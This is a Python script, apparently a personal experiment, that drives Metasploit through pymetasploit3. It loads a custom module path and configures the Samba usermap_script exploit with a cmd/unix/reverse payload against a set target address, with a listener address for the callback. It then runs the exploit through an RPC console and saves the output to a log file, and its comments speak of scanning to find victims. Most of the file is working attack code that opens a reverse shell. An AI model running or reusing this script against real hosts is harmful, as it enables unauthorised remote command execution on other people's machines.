from pymetasploit3.msfrpc import MsfRpcClient
import os

PWD = "lazero"

custom_module_path = "custom_msf_module"
assert os.path.exists(custom_module_path), (
    "Custom module path not found at: '%s'" % custom_module_path
)
# but still little info obtained from script run

client = MsfRpcClient(
    password=PWD, ssl=True
)  # requires ssl by default. otherwise won't work

# in this way you would get more information tha ever.
# you would scan and find victims.
# postgresql databases.
# client.db.connect()

# the module structure must be identical to the one at , otherwise it will not load.
client.core.addmodulepath(os.path.abspath(custom_module_path))
# client.core.addmodulepath("/root/Desktop/works/hack_all_the_thing/tests/scan_kali_ip_by_dns_scan/custom_msf_module") # return new stats.

# search api will not work.
# client.modules.search("test_payload")
# but loading the new module works.
# client.modules.use("payload", "test_payload")

# load or loadpath will not work.
# call_result = client.call("loadpath", opts=['/root/Desktop/works/hack_all_the_thing/tests/scan_kali_ip_by_dns_scan/custom_msf_module'])

# print("call result:") # dict, error
# dict_keys(['error', 'error_class', 'error_string', 'error_backtrace', 'error_message'])
# print(call_result)
# payload_module = client.modules.use("payload", "/root/Desktop/works/hack_all_the_thing/tests/scan_kali_ip_by_dns_scan/custom_msf_module/test_payload.rb")
# breakpoint()

# port: 139

exploit_id = "multi/samba/usermap_script"
# below not valid in console
# exploit_id = "exploit/multi/samba/usermap_script"
exp_mod = client.modules.use("exploit", exploit_id)
# breakpoint()
# exp_info = exp_mod.info # has info about the exploit.
# with keys:
# ['type', 'name', 'fullname', 'rank', 'disclosuredate', 'description', 'license', 'filepath', 'arch', 'platform', 'authors', 'privileged', 'references', 'targets', 'default_target', 'stance', 'options']

# you may be interested in the source code specified by filepath

# 4444
# client.modules.use("payload", "cmd/unix/reverse").info['options']['LPORT']
# payload_module = client.modules.use("payload", "cmd/unix/reverse")
# payload source code:
# print(open(client.modules.use("payload", "cmd/unix/reverse").info['filepath'],'r').read())

# question: how to write and load custom modules?
# answer: write it in structured directory, then load it with client.core.addcustommodule(absolute_path_to_module)


# question: how do you get run output?
RHOST = "172.16.194.172"
LHOST = "172.16.194.163"

exp_mod.runoptions["RHOST"] = RHOST  # this host is not running.
exp_mod.runoptions["PAYLOAD"] = "cmd/unix/reverse"
exp_mod.runoptions["LHOST"] = LHOST

# payload_module.runoptions['RHOST'] = RHOST
# payload_module.runoptions['LHOST'] = LHOST

# so you get a job id after execution.
# exploit_execute_output = exp_mod.execute() # {'job_id': 0, 'uuid': 'wmmpurfl'}
# print(exploit_execute_output)
# breakpoint()

# exploit_check_output = exp_mod.check() # error, this module is not checkable
# breakpoint()
# the job is not running.
# problem is, you do not have any feedback

# except for some session you may accidentally have access to.

# client.jobs
# client.jobs.info()

# client.consoles.console().write('')
# it is not so tolerant with the name error when running with console.
msf_console = (
    client.consoles.console()
)  # you can manually read/write instead of using below method.
# timeout: 301 seconds.
exploit_run_output = msf_console.run_module_with_output(exp_mod)  # str
# exploit_run_output = client.consoles.console().run_module_with_output(exp_mod,payload=payload_module) # str
print(exploit_run_output)  # now have output. but still it is not streaming.
# you may want to overwrite the original implementation. the data is actually produced step by step.

run_output_file = "samba_usermap_script_output.log"
with open(run_output_file, "w+") as f:
    f.write(exploit_run_output)
print("[metasploit]", "output file saved at:", run_output_file)

# write custom python modules with:
# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html

# thank you very much.
